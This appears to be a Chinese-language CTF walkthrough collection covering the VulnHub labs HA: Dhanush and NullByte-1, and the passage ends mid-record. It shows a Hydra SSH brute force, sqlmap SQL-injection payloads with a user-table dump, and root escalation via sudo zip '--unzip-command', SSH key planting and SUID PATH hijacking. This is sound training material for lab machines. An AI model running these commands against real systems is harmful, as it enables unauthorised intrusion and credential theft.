|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
|_    http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
```

``` bash
root@kali:~# nmap -p- -A 192.168.142.131
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Dhanush
65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)
|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)
|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)
```

现在，在进一步之前，此网页可能包含Dhanush的大量信息。 同样，这些可能是用户名或密码。 因此，决定使用cewl命令制作字典。

``` bash
root@kali:~# cewl http://192.168.142.131/ -w dict1.txt
CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:~# cat dict1.txt 
Dhanush
धनष
Lord
Feature
Wielded
the
यद
यग
Arjuna
was
able
his
and
Then
path
The
Header
लनर
भवत
भरत
यत
थनमधर
तदत
मन
सजम
यहम
परत
रणय
सधन
वनशय
दष
कतम
मसस
थपनर
थय
भवम
What
Banner
Dhanushधनष
Weapon
for
shooting
arrows
typically
made
curved
piece
wood
joined
both
ends
Taut
String
दनय
सबस
तशल
धनषWorld
Most
Powerful
Dhanushs
Sharang
Dhanushसरग
Vishnu
Made
Viswakarma
Pinak
Dhanushपनक
ShivaMade
pinak
Gandiv
Dhanushगण
डव
ArjunaMade
Brahma
Portfolio
Choose
Yoursअपन
चन
Heat
Mahabharata
not
lift
against
Family
Gurus
Krishna
tells
him
this
Dhram
Eternal
Truth
war
You
CTF
Warrior
Pick
your
attain
Boot
Hacking
Articles
All
rights
reserved
Scripts
Raj
Aarti
Geet
Yashika
Kavish
Rishab
Japneet
Pavan
```

#### 爆破ssh的用户名和密码

``` bash
root@kali:~# hydra -L dict1.txt -P dict1.txt ssh://192.168.142.131 -s 65345 -I -e nsr -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 22:03:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 13338 login tries (l:114/p:117), ~834 tries per task
[DATA] attacking ssh://192.168.142.131:65345/
[STATUS] 214.00 tries/min, 214 tries in 00:01h, 13127 to do in 01:02h, 16 active
[STATUS] 149.67 tries/min, 449 tries in 00:03h, 12892 to do in 01:27h, 16 active
[STATUS] 154.14 tries/min, 1079 tries in 00:07h, 12262 to do in 01:20h, 16 active
[STATUS] 154.67 tries/min, 2320 tries in 00:15h, 11024 to do in 01:12h, 16 active

[STATUS] 151.68 tries/min, 4702 tries in 00:31h, 8643 to do in 00:57h, 16 active
[STATUS] 151.43 tries/min, 7117 tries in 00:47h, 6229 to do in 00:42h, 16 active
[65345][ssh] host: 192.168.142.131   login: pinak   password: Gandiv
[STATUS] attack finished for 192.168.142.131 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 22:56:20
```

 - 用户名/密码  ------  pinak/Gandiv

现在有了SSH的登录凭据，pinak/Gandiv登录并进行查看。 运行sudo -l命令检查sudoers列表，发现有效的cp命令以sarang用户身份运行，没有任何密码，因此可以使用它。 看一下用户sarang。 在sarang的主目录中，看到一个标记为“ .ssh”的隐藏目录。 试图打开它，但受到限制。

``` bash
root@kali:~# ssh pinak@192.168.142.131 -p 65345
The authenticity of host '[192.168.142.131]:65345 ([192.168.142.131]:65345)' can't be established.
ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.142.131]:65345' (ECDSA) to the list of known hosts.
pinak@192.168.142.131's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Nov  8 09:05:56 2019
pinak@ubuntu:~$ id
uid=1001(pinak) gid=1001(pinak) groups=1001(pinak)
pinak@ubuntu:~$ whoami
pinak
pinak@ubuntu:~$ 
pinak@ubuntu:~$ pwd
/home/pinak
pinak@ubuntu:~$ sudo -l
Matching Defaults entries for pinak on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pinak may run the following commands on ubuntu:
    (sarang) NOPASSWD: /bin/cp
pinak@ubuntu:~$ cd /home/sarang
pinak@ubuntu:/home/sarang$ ls -la
total 32
drwxr-xr-x 4 sarang sarang 4096 Nov  8 08:03 .
drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ..
-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history
-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout
-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc
drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache
-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile
drwx------ 2 sarang sarang 4096 Nov  7 21:35 .ssh
pinak@ubuntu:/home/sarang$ cd .ssh
-bash: cd: .ssh: Permission denied
```

使用cp命令进入sarang用户。 需要将ssh密钥显示在sarang用户主目录内的.ssh目录中。 尽管该文件只能读取，但可以使用cp命令在该目录中发送密钥。 为此，首先需要生成这些密钥。 为此使用ssh-keygen。 使用ssh-keygen后，进入pinak用户主目录内的.ssh目录中以找到id_rsa公钥。 给它适当的权限。 并将其移动到pinak用户主目录。

``` bash
pinak@ubuntu:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/pinak/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/pinak/.ssh/id_rsa.
Your public key has been saved in /home/pinak/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:M3EjxpbK4Ni6vFhkYjtaUWnV7IRl6gK/2ab8B3FLz+U pinak@ubuntu
The key's randomart image is:
+---[RSA 2048]----+
|      .=o        |
|     o.++.       |
|  . = .oB o      |
|   O +.+++ ..    |
|..= = ++S+ o     |
|.+.o =. .oo E    |
| o+ o o.         |
|.=.o o  .        |
|o +.o...         |
+----[SHA256]-----+
pinak@ubuntu:~$ cd .ssh
pinak@ubuntu:~/.ssh$ ls
id_rsa  id_rsa.pub
pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub
pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak
pinak@ubuntu:~/.ssh$ cd ..
pinak@ubuntu:~$ ls
id_rsa.pub
```

现在已经转移了公钥，现在使用cp命令作为sarang用户在sarang用户主目录中的.ssh目录中复制公钥了。 需要将sudo与cp命令一起使用，并提供源目录和目标目录。 完成此操作后，只需要使用刚转让的密钥以sarang身份登录即可。 可以看到它运行良好。 以成功的用户身份登录后，再次运行sudo -l命令，因为该用户不是root用户，目标是获得root用户。 看到zip命令具有sudo权限，可滥用该权限来升级此计算机上的特权。

``` bash
pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys
pinak@ubuntu:~$ ssh sarang@127.0.0.1 -i /.ssh/authorized_keys -p 65345
Warning: Identity file /.ssh/authorized_keys not accessible: No such file or directory.
The authenticity of host '[127.0.0.1]:65345 ([127.0.0.1]:65345)' can't be established.
ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:65345' (ECDSA) to the list of known hosts.
Enter passphrase for key '/home/pinak/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100
sarang@ubuntu:~$ sudo -l
Matching Defaults entries for sarang on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sarang may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/zip
```

#### 提权

使用最近通过ssh登录的用户sarang。 使用sudo命令列出用户可以使用root特权运行的所有命令，可以看到用户可以以root用户身份运行zip命令，而无需输入任何密码。
因此，现在正在将权限从“sarang”提升到“root”。 创建一个文件“lucifer11”，然后执行命令：首先将文件“lucifer11”压缩，然后将其移动到/tmp/lucifer11.zip文件夹，最后解压缩，然后弹出root的shell，提权成功。

``` bash
sarang@ubuntu:~$ touch lucifer11
sarang@ubuntu:~$ ls
lucifer11
sarang@ubuntu:~$ pwd
/home/sarang
sarang@ubuntu:~$ sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command="sh -c /bin/bash"
  adding: home/sarang/lucifer11 (stored 0%)
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# whoami
root
```

这次提权方式太帅，记下来

``` bash
sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command="sh -c /bin/bash"
```

获取flag

``` bash
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
flag.txt
root@ubuntu:/root# cat flag.txt 
          
                                            @p
                                           @@@.
                                          @@@@@
                                         @@@@@@@
                                        *"`]@P ^^
                                           ]@P
                                           ]@P
                               ,,,,        ]@P       ,,gg,,
                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,
                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w
                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g
                    g@@@P`                 -@                   "B@@w
                  ,@@@`                    ]@                      %@@,
                 @@P-                      ]@                        *@@,
              ,@@"                         ]@                          *B@
            ,@N"                          y@@B                            %@,
      ,,  g@P-                            ]@@@P                             *Bg ,gg
      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN"

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
____________________________________
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg)

Flag太帅，犹如利剑正中敌人心脏！！！然后狠狠穿透！！！

<font color="red">Key:网页用户名收集，hydra爆破,ssh公钥滥用,/usr/bin/zip,/bin/cp的无需root密码的权限滥用。</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end HA-Dhanush -->

</details>

<a id="case-nullbyte-1"></a>

## PATH 解析与 SUID 子进程

图像信息和查询入口连接账户，procwatch 使用外部命令的方式改变 PATH 的安全含义。原文保留环境变量、SUID 和数据库替代分支。

<p class="kb-provenance">来源 NullByte-1 · 原记录 2020-01-02 · 14 个代码块 · 6 处图片引用</p>

<details class="kb-evidence" id="record-nullbyte-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start NullByte-1 -->

#### 名称
名称：NullByte: 1
发布日期：2015年8月1日

#### 下载
 - Download: http://ly0n.me/nullbyte/NullByte.ova.zip
 - Download (Mirror): https://download.vulnhub.com/nullbyte/NullByte.ova.zip
 - Download (Torrent): https://download.vulnhub.com/nullbyte/NullByte.ova.zip.torrent



#### 描述

代号：NB0x01
下载：ly0n.me/nullbyte/NullByte.ova.zip
目标：转到/root/proof.txt并按照说明进行操作。
级别：基础到中级。
说明：Boot2root，Box将从dhcp获取IP，可与virtualbox＆vmware正常工作。
提示：使用您的横向思考技巧，也许您需要编写一些代码。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.106
Host is up (0.00024s latency).
MAC Address: 08:00:27:FE:89:AF (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -p- -sV -Pn -v 192.168.56.106
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
50480/tcp open  status  1 (RPC #100024)
```

``` bash
root@kali:~# nmap -sV -Pn -T5 -v -A --script=vuln -p 80,111,777,50480 192.168.56.106
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting folder
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
111/tcp   open  rpcbind 2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44704/tcp6  status
|   100024  1          47970/udp6  status
|   100024  1          50480/tcp   status
|_  100024  1          54179/udp   status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
50480/tcp open  status  1 (RPC #100024)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

可以看到ssh端口开在777

页面上有图像。 在页面源上没有找到任何内容。 但是图像中可能隐藏了一些东西，因此，使用exiftool读取图像，因此下载该图像。

``` bash
root@kali:~# exiftool main.gif 
ExifTool Version Number         : 11.80
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2020:01:01 21:14:10-05:00
File Access Date/Time           : 2020:01:01 21:14:10-05:00
File Inode Change Date/Time     : 2020:01:01 21:14:10-05:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

发现Comment处有一串字符kzMb5nVYJw，可能是密码或者目录

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg)

假设是正确的，但这是一个key。 不知道密钥是什么，因此，使用字典攻击通过BurpSuite和rockyou.txt查找到密钥elite.

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub122.jpg)

输入密匙，跳转到下面的页面，要求输入username，猜测username处可能存在注入

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub123.jpg)

``` bash
$ sqlmap.py -r sqlmap.txt
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.12.1#dev}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:41:51 /2020-01-02/

[10:41:51] [INFO] parsing HTTP request from 'sqlmap.txt'
[10:41:51] [INFO] testing connection to the target URL
[10:41:51] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:41:51] [INFO] testing if the target URL content is stable
[10:41:51] [INFO] target URL content is stable
[10:41:51] [INFO] testing if GET parameter 'usrtosearch' is dynamic
[10:41:51] [WARNING] GET parameter 'usrtosearch' does not appear to be dynamic
[10:41:51] [INFO] heuristic (basic) test shows that GET parameter 'usrtosearch' might be injectable (possible DBMS: 'MySQL')
[10:41:51] [INFO] testing for SQL injection on GET parameter 'usrtosearch'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:41:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:41:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:41:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:41:52] [WARNING] reflective value(s) found and filtering out
[10:41:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:41:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[10:41:53] [INFO] GET parameter 'usrtosearch' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="ID")
[10:41:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:41:53] [INFO] GET parameter 'usrtosearch' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable
[10:41:53] [INFO] testing 'MySQL inline queries'
[10:41:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:41:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:41:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:41:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:41:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:41:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:41:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:42:03] [INFO] GET parameter 'usrtosearch' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[10:42:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:42:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:42:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:42:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:42:03] [INFO] target URL appears to have 3 columns in query
[10:42:03] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[10:42:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'usrtosearch' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 137 HTTP(s) requests:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=1111" OR NOT 7451=7451#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=1111" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a6a6271,(SELECT (ELT(9768=9768,1))),0x7171627171,0x78))s), 8446744073709551610, 8446744073709551610)))-- Irce

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=1111" AND (SELECT 7630 FROM (SELECT(SLEEP(5)))fzHD)-- xAIX

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=1111" UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6271,0x7a5249786a7646744654494a6d676f4c78454f63675a7a4d786f757a42744a515649526e7574704b,0x7171627171)#
---
[10:42:03] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[10:42:03] [INFO] fetched data logged to text files under 'C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.56.106'

[*] ending @ 10:42:03 /2020-01-02/
```

查找其中的用户名和密码

``` bash
root@kali:~# sqlmap -r sqlmap.txt -D seth -T users --dump
        ___
       __H__                                                                                           
 ___ ___[,]_____ ___ ___  {1.3.12#stable}                                                              
|_ -| . [.]     | .'| . |                                                                              
|___|_  [.]_|_|_|__,|  _|                                                                              
      |_|V...       |_|   http://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:53:36 /2020-01-01/

[21:53:36] [INFO] parsing HTTP request from 'sqlmap.txt'
[21:53:36] [INFO] resuming back-end DBMS 'mysql' 
[21:53:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=1111" OR NOT 8608=8608#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=1111" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b767671,(SELECT (ELT(6518=6518,1))),0x7171706b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SFDc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=1111" AND (SELECT 5358 FROM (SELECT(SLEEP(5)))oBUJ)-- bKCB

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=1111" UNION ALL SELECT NULL,CONCAT(0x716b767671,0x564b5772465344646f7a6a79776666466b735572476570706b70585a4a704d624f704e54684f5172,0x7171706b71),NULL#
---
[21:53:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:53:36] [INFO] fetching columns for table 'users' in database 'seth'
[21:53:36] [INFO] fetching entries for table 'users' in database 'seth'
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

[21:53:36] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.56.106/dump/seth/users.csv'                                                                                             
[21:53:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.106'

[*] ending @ 21:53:36 /2020-01-01/
```

得到ramses/YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE，先将字符串YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE解密，得到c6d6bd7ebf806f43c76acc3681703bODE然后在在线网站上将hash解密，得到值omega

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub124.jpg)

有了username和password，下面就是ssh连接

#### getshell

使用ramses/omega连接ssh

``` bash
root@kali:~# ssh ramses@192.168.56.106 -p 777
The authenticity of host '[192.168.56.106]:777 ([192.168.56.106]:777)' can't be established.
ECDSA key fingerprint is SHA256:H/Y/TKggtnCfMGz457Jy6F6tUZPrvEDD62dP9A3ZIkU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.106]:777' (ECDSA) to the list of known hosts.
ramses@192.168.56.106's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
ramses@NullByte:~$ whoami
ramses
```

#### 提权1

查看具有SUID权限的二进制文件

``` bash
ramses@NullByte:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/procmail
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/exim4
/var/www/backup/procwatch
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
```

发现/var/www/backup/procwatch的SUID位已启用，非常吸引人。 进一步探索它。

``` bash
ramses@NullByte:~$ cd /var/www/backup/
ramses@NullByte:/var/www/backup$ ls
procwatch  readme.txt
ramses@NullByte:/var/www/backup$ cat readme.txt 
I have to fix this mess... 
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 1664 pts/0    00:00:00 procwatch
 1665 pts/0    00:00:00 sh
 1666 pts/0    00:00:00 ps
```

ummm,没有变成root用户，看来还需要做点什么
因此，当运行上述命令时，看起来procwatch文件正在尝试运行ps，这是/bin内用于处理状态的真实文件。 作者在这里可以考虑的最重要的事情是，作者已将procwatch的SUID位设置为ON，并且可能是调用系统功能（例如ps）的任何小程序文件。
利用它的优势，可以升级root特权并实现root该VM。 将必须操作环境PATH变量。 如果可以使procwatch运行sh而不是ps，它应该返回一个root shell。 以下使用环境$ PATH变量及其操作环境变量的方法称为Linux特权升级。

``` bash
ramses@NullByte:/var/www/backup$ echo "/bin/sh"  > ps
ramses@NullByte:/var/www/backup$ chmod 777 ps
ramses@NullByte:/var/www/backup$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# whoami
root
```
成功提权，帅呆了,提权方法太帅，记下来

``` bash
echo "/bin/sh" > ps
